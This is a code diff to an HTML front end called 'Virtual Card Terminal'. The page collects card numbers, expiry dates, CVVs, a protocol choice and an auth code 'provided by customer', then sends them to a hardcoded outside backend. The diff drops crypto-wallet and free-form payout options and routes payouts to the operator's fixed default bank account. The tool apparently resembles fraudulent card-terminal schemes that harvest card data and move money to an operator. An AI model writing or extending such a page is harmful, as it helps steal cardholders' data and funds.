@@ -9,14 +9,14 @@
     .wrap { max-width: 780px; margin: 32px auto; padding: 16px; }
     .card { background:#121a35; border:1px solid #24305e; border-radius:16px; padding:20px; }
     h1 { margin: 8px 0 20px 0; font-size: 22px; font-weight: 600; }
-    .row { display:flex; gap:12px; }
-    .col { flex:1; }
+    .row { display:flex; gap:12px; flex-wrap:wrap; }
+    .col { flex:1; min-width: 100px; }
     label { display:block; font-size:13px; margin-bottom:6px; color:#b9c0dd; }
     input, select { width:100%; padding:10px 12px; border-radius:10px; background:#0e1530; border:1px solid #2a396d; color:#e7e7ea; }
     button { margin-top:14px; width:100%; padding:12px; border-radius:12px; background:#2b7cff; color:white; border:0; font-weight:600; cursor:pointer; }
     button:disabled { opacity:.6; cursor:not-allowed; }
     .note { font-size:12px; color:#8da2d8; margin-top:10px; }
-    .result { margin-top:14px; padding:12px; border-radius:10px; background:#0e1530; border:1px solid #2a396d; }
+    .result { margin-top:14px; padding:12px; border-radius:10px; background:#0e1530; border:1px solid #2a396d; word-break: break-word; }
     a.link { color:#9cc0ff; text-decoration: none; }
   </style>
 </head>
@@ -26,28 +26,10 @@
       <h1>Virtual Card Terminal</h1>
 
       <form id="cardForm" autocomplete="off">
-        
-        <label>Payout Type</label>
-        <select name="payout_type" id="payout_type" required>
-          <option value="BANK">Bank Transfer</option>
-          <option value="CRYPTO">Crypto Wallet</option>
-        </select>
-
-        <div id="cryptoFields" style="display:none;">
-          <label>Payout Network</label>
-          <select name="payout_network" id="payout_network">
-            <option value="">-- Select Network --</option>
-            <option value="BTC">Bitcoin</option>
-            <option value="ETH">Ethereum</option>
-            <option value="USDT">Tether</option>
-          </select>
-        </div>
-
-        <label>Payout Target</label>
-        <input name="payout_target" placeholder="Bank account number or wallet address" required />
+        <input type="hidden" name="payout_type" value="BANK" />
 
         <label>Card Number</label>
-        <input name="card_number" placeholder="Card Number" required />
+        <input name="card_number" placeholder="4111111111111111" required />
 
         <div class="row">
           <div class="col">
@@ -60,7 +42,7 @@
           </div>
           <div class="col">
             <label>CVV</label>
-            <input name="cvv" placeholder="CVV" required />
+            <input name="cvv" placeholder="123" required />
           </div>
         </div>
 
@@ -80,7 +62,7 @@
           </div>
           <div class="col">
             <label>Auth Code</label>
-            <input name="auth_code" placeholder="Auth Code" required />
+            <input name="auth_code" placeholder="Provided by customer" required />
           </div>
           <div class="col">
             <label>Amount (USD)</label>
@@ -88,7 +70,8 @@
           </div>
         </div>
 
-        <button id="submitBtn" type="submit">Process Payment</button>
+        <button id="submitBtn" type="submit">Process Payment → Send to Default Bank</button>
+        <div class="note">Payout destination is fixed by backend to your default account.</div>
 
         <div id="result" class="result" style="display:none;"></div>
       </form>
@@ -100,14 +83,8 @@
   </div>
 
   <script>
-    const BACKEND_URL = (window.BACKEND_URL || "{{ backend|default('') }}");
-
-    const payoutType = document.getElementById('payout_type');
-    const cryptoFields = document.getElementById('cryptoFields');
-
-    payoutType.addEventListener('change', () => {
-      cryptoFields.style.display = payoutType.value === 'CRYPTO' ? 'block' : 'none';
-    });
+    // Point to your deployed backend
+    const BACKEND_URL = "https://befe.onrender.com";
 
     const form = document.getElementById('cardForm');
     const submitBtn = document.getElementById('submitBtn');
@@ -120,27 +97,40 @@
       resultBox.textContent = '';
 
       const fd = new FormData(form);
-      const payload = Object.fromEntries(fd.entries());
-
-      payload.amount = Number(payload.amount);
+      const payload = {
+        card_number:  fd.get('card_number').trim(),
+        expiry_month: fd.get('expiry_month').trim(),
+        expiry_year:  fd.get('expiry_year').trim(),
+        cvv:          fd.get('cvv').trim(),
+        protocol:     fd.get('protocol'),
+        auth_code:    fd.get('auth_code').trim(),
+        amount:       Number(fd.get('amount')),
+        payout_type:  'BANK' // backend uses env vars for bank details
+      };
 
       try {
-        const res = await fetch(`${BACKEND_URL}/process`, {
+        const res = await fetch(`${BACKEND_URL}/api/v1/transactions/process`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload),
         });
-        const data = await res.json();
+
+        let data;
+        try {
+          data = await res.json();
+        } catch {
+          throw new Error(`Invalid JSON from server (status ${res.status})`);
+        }
 
         resultBox.style.display = 'block';
         if (res.ok) {
-          resultBox.textContent = `Status: ${JSON.stringify(data)}`;
+          resultBox.textContent = `✅ Status: ${data.status} | Reference: ${data.reference} | Mode: ${data.mode}`;
         } else {
-          resultBox.textContent = `Error: ${data.detail || JSON.stringify(data)}`;
+          resultBox.textContent = `❌ Error: ${data.detail || JSON.stringify(data)}`;
         }
       } catch (err) {
         resultBox.style.display = 'block';
-        resultBox.textContent = 'Network error: ' + err;
+        resultBox.textContent = 'Network error: ' + err.message;
       } finally {
         submitBtn.disabled = false;
       }
